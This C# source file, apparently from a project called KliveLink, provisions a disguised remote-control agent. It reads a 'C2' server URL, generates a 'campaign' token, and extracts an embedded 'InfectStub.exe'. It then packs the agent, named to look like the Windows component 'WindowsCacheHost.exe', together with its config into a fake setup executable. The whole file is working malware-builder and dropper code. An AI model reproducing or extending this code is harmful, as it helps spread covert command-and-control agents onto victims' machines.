using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using KliveLink.Contracts;

namespace Omnipotent.Services.KliveLink;

/// <summary>
/// Generates the deployment assets the dashboard needs. A portable server install
/// should not require a developer to copy a setup EXE or agent beside the binary.
/// </summary>
public static class KliveLinkAssetProvisioner
{
    private const string GeneratedFolder = "generated";
    private static readonly object Gate = new();

    public static string GeneratedDirectory(KliveLinkV2Options options)
        => Path.Combine(options.DataDirectory, GeneratedFolder);

    public static void Ensure(KliveLinkV2Options options)
    {
        lock (Gate)
        {
            try
            {
                string generated = GeneratedDirectory(options);
                Directory.CreateDirectory(generated);
                string token = EnsureCampaignToken(options);
                string server = Environment.GetEnvironmentVariable("KLIVELINK_C2_URL")
                    ?? "wss://klive.dev/klivelink/v2/ws";
                string configPath = Path.Combine(generated, "klive.config.json");
                string config = JsonSerializer.Serialize(new
                {
                    server,
                    token,
                    agentId = "",
                }, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(configPath, config);

                string agentPath = Path.Combine(generated, "WindowsCacheHost.exe");
                string? managed = KliveLinkAssetLocator.Find("WindowsCacheHost.exe");
                if (!string.IsNullOrWhiteSpace(managed) &&
                    !string.Equals(Path.GetFullPath(managed), Path.GetFullPath(agentPath), StringComparison.OrdinalIgnoreCase))
                {
                    File.Copy(managed, agentPath, true);
                }
                else if (!File.Exists(agentPath))
                {
                    ExtractResource("KliveLink.NativeAgent", agentPath);
                }

                string stubPath = Path.Combine(generated, "InfectStub.exe");
                ExtractResource("KliveLink.InfectStub", stubPath);

                string setupStub = Path.Combine(generated, "BundledSetup.stub.exe");
                ExtractResource("KliveLink.BundledSetup", setupStub);
                string setupPath = Path.Combine(generated, "WindowsCacheHostSetup.exe");
                BuildSetup(setupStub, agentPath, configPath, setupPath);
                try { File.Delete(setupStub); } catch { }
            }
            catch
            {
                // The dashboard routes will report "installer not found" if provisioning fails.
            }
        }
    }

    private static string EnsureCampaignToken(KliveLinkV2Options options)
    {
        string generated = GeneratedDirectory(options);
        string plaintextPath = Path.Combine(generated, "agent-token.txt");
        if (File.Exists(plaintextPath))
        {
            string existing = File.ReadAllText(plaintextPath).Trim();
            if (existing.Length > 0) return existing;
        }

        string token = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32))
            .Replace("+", "-").Replace("/", "_").TrimEnd('=');
        Directory.CreateDirectory(Path.GetDirectoryName(options.TokenFilePath)!);
        var hashes = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        if (File.Exists(options.TokenFilePath))
        {
            try
            {
                using JsonDocument doc = JsonDocument.Parse(File.ReadAllText(options.TokenFilePath));
                if (doc.RootElement.TryGetProperty("tokens", out JsonElement tokens))
                    foreach (JsonElement item in tokens.EnumerateArray())
                        if (item.GetString() is { Length: > 0 } hash) hashes.Add(hash);
            }
            catch { }
        }
        string tokenHash = KliveLinkV2Options.NormalizeHash(token);
        hashes.Add(tokenHash);
        File.WriteAllText(options.TokenFilePath, JsonSerializer.Serialize(new { tokens = hashes }));
        options.TokenHashes.Add(tokenHash);
        File.WriteAllText(plaintextPath, token);
        return token;
    }

    private static void ExtractResource(string name, string path)
    {
        using Stream? stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
        if (stream == null) throw new InvalidOperationException($"Missing embedded resource {name}");
        using FileStream output = File.Create(path);
        stream.CopyTo(output);
    }

    private static void BuildSetup(string stubPath, string agentPath, string configPath, string setupPath)
    {
        byte[] stub = File.ReadAllBytes(stubPath);
        byte[] agent = File.ReadAllBytes(agentPath);
        byte[] config = File.ReadAllBytes(configPath);
        using var memory = new MemoryStream(stub.Length + agent.Length + config.Length + 600);
        memory.Write(stub);
        long agentOffset = memory.Position;
        memory.Write(agent);
        long configOffset = memory.Position;
        memory.Write(config);
        using (var writer = new BinaryWriter(memory, Encoding.UTF8, leaveOpen: true))
        {
            writer.Write(Encoding.ASCII.GetBytes("KLINF1\0\0"));
            writer.Write(0UL);
            writer.Write(0UL);
            writer.Write((ulong)agentOffset);
            writer.Write((ulong)agent.Length);
            writer.Write((ulong)configOffset);
            writer.Write((ulong)config.Length);
            writer.Write(new byte[520]);
        }
        File.WriteAllBytes(setupPath, memory.ToArray());
    }
}
